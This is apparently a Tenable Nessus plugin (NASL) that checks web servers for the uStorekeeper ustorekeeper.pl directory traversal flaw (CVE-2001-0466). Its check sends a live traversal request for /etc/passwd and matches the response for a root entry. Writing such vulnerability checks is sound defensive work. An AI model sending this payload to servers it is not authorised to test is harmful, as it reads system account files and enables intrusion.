#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10645);
 script_version ("$Revision: 1.28 $");
 script_cve_id("CVE-2001-0466");
 script_bugtraq_id(2536);
 script_osvdb_id(534);

 script_name(english:"uStorekeeper ustorekeeper.pl file Parameter Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows reading
arbitrary files." );
 script_set_attribute(attribute:"description", value:
"The 'ustorekeeper.pl' CGI script installed on the remote host allows
an attacker to read arbitrary files subject to the privileges of the
http daemon (usually root or nobody)." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=98633176230748&w=2" );
 script_set_attribute(attribute:"solution", value:
"Remove the CGI script." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/04/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/04/03");
 script_cvs_date("$Date: 2011/08/08 11:28:04 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Checks for the presence of ustorekeeper.pl");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "web_traversal.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (get_kb_item("www/"+port+"/generic_traversal"))
  exit(0, 'The web server on port '+port+' is vulnerable to web directory traversal.');

foreach dir (cgi_dirs())
{
 u = string(dir, "/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd");
 r = http_send_recv3(method:"GET", item: u, port:port, exit_on_fail: 1);
 if (egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
 {
   if (report_verbosity > 0)
   {
     txt = '\nThis URL returns the content of /etc/passwd :\n' +
     	 build_url(port: port, qs: u) + '\n';
     security_warning(port:port, extra: txt);
   }
   else
     security_warning(port);
   exit(0);
 }
}

exit(0, 'The web server on port '+port+' is not vulnerable.');
